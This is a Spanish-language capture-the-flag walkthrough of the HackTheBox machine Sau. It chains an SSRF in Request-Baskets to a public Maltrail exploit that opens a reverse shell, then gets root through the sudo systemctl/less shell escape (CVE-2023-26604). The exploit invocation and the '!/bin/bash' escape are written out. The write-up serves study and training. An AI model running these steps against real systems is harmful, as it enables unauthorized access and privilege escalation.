# HackTheBox Sau Walkthrough

Este documento proporciona un walkthrough detallado para comprometer la máquina Sau en HackTheBox, destacando las técnicas y herramientas clave empleadas en cada etapa.

## Tabla de Contenidos

- [Introducción](#introducción)
- [Reconocimiento](#reconocimiento)
- [Explotación](#explotación)
  - [Explotación de SSRF en Request-Baskets](#explotación-de-ssrf-en-request-baskets)
  - [Explotando Maltrail](#explotando-maltrail)
- [Post-Explotación](#post-explotación)
- [Conclusión](#conclusión)

## Introducción

El propósito de este walkthrough es documentar el proceso seguido para comprometer la máquina Sau, enfocándose en superar varios desafíos de seguridad para obtener acceso como usuario y, finalmente, acceso total.

## Reconocimiento

El reconocimiento es el primer paso crítico en cualquier prueba de penetración. Utilicé `nmap` para identificar los puertos abiertos y los servicios en ejecución en la máquina objetivo:

nmap -sC -sV -oN nmap_initial <IP de la máquina>

Los resultados revelaron los siguientes puertos abiertos:

- **22/tcp** - SSH
- **80/tcp** - HTTP (No respondía)
- **55555/tcp** - HTTP (Accesible)

![Nmap](/img/Nmap.PNG)

La solicitud al servidor HTTP a través del puerto 80 no obtuvo respuesta., pero el puerto 55555 reveló una aplicación web llamada **Request-baskets**.

![VentanaPrincipal](/img/Request-baskets.PNG)

## Explotación

### Explotación de SSRF en Request-Baskets

**Request-Baskets** es una herramienta para crear puntos finales temporales para inspeccionar solicitudes HTTP. La versión 1.2.1, que estaba en uso, es vulnerable a SSRF (Server Side Request Forgery). Aproveché esta vulnerabilidad para acceder a servicios internos, en particular, al servicio en el puerto 80.

![SSRF](/img/SSRF.PNG)

### Explotando Maltrail

El servicio interno redirigido resultó ser **Maltrail**, una aplicación web de monitoreo de tráfico malicioso. 

![Maltrail](/img/Maltrail.PNG)

Una búsqueda en Google reveló una vulnerabilidad en la versión específica en uso, permitiéndome ejecutar un reverse shell a través de un exploit disponible públicamente: https://github.com/spookier/Maltrail-v0.53-Exploit

python3 exploit.py [IP de escucha] [Puerto de escucha] [URL objetivo]

Utilicé Netcat para escuchar conexiones entrantes en el puerto especificado, lo que me permitió obtener acceso al sistema como el usuario **puma**.


## Post-Explotación

Dentro del directorio home del usuario **puma**, encontré el archivo `user.txt`, que contenía la flag de usuario.

![Usuario](/img/Usuario.PNG)

Ahora es el turno de escalar privilegios, la cual desde mi punto de vista es la parte más complicada.

Comienzo ejecutando el comando sudo -l, y observo que el usuario puma tiene permisos para ejecutar un servicio de systemctl como root.

![Sudoers](/img/sudol.PNG)

Teniendo en cuenta esto, compruebo cual es la version del servicio systemctl con el comando:

systemctl --version

![Systemctl](/img/SystemCtlVersion.PNG)


Realizo una búsqueda y encuentro una vulnerabilidad con la versión que observamos: CVE-2023-26604

Me ha costado bastante entender esta vulnerabilidad, pero dejo por aquí la explicación de lo que yo he entendido.

Para entenderla, primero es importante conocer algunos componentes involucrados:

- systemd: Es un sistema y gestor de servicios para Linux, utilizado para iniciar, detener y gestionar varios servicios y procesos durante el arranque del sistema y mientras el sistema está en funcionamiento.
  
- sudo: Es un programa para sistemas Unix y Linux que permite a los usuarios ejecutar programas con los privilegios de seguridad de otro usuario, normalmente el superusuario (root).
  
- less: Es un programa de paginación que permite ver (pero no cambiar) el contenido de un archivo de texto una pantalla a la vez. Es utilizado por muchos programas para mostrar texto. Y  permite al usuario invocar un shell o ejecutar comandos directamente desde su interfaz.

- LESSSECURE: Es una variable de entorno que, cuando se establece en 1, hace que less funcione en un "modo seguro", limitando algunas características para evitar posibles vulnerabilidades de seguridad.

La vulnerabilidad surge de la forma en que systemd maneja la ejecución de ciertos comandos (como systemctl status) cuando se invoca a través de sudo . En configuraciones específicas de sudoers que permiten a los usuarios no privilegiados ejecutar systemctl status mediante sudo (este es nuestro caso, como hemos visto al ejecutar el comando sudo -l), si el resultado del comando es demasiado extenso para caber en la pantalla, sudo invocará automáticamente a less para paginar la salida. Aprovechandonos de que less está ejecutado como root, aprovechamos para invocar un shell como root.

Para realizarlo:

- Ejecutamos el comando para el cual tenemos permisos de root: sudo /usr/bin/systemctl status trail.service

- Una vez ejecutado observamos que se ha ejecutado less, y escribimos : !/bin/bash

  ![EscaladoRoot](/img/EscaladoRoot.PNG)

Así conseguimos ejecutar una shell en bash con privilegios de root, una vez dentro nos dirigimos a la carpeta root y  observamos que está la flag de root, finalizando así el desafío.

## Conclusión

Este documento detalla el proceso seguido para comprometer la máquina Sau en HackTheBox, desde el reconocimiento inicial hasta la post-explotación. Este ejercicio subraya la importancia de la actualización de software, ya que como hemos visto, las vulnerabilidades aprovechadas se debían a software desactualizado.


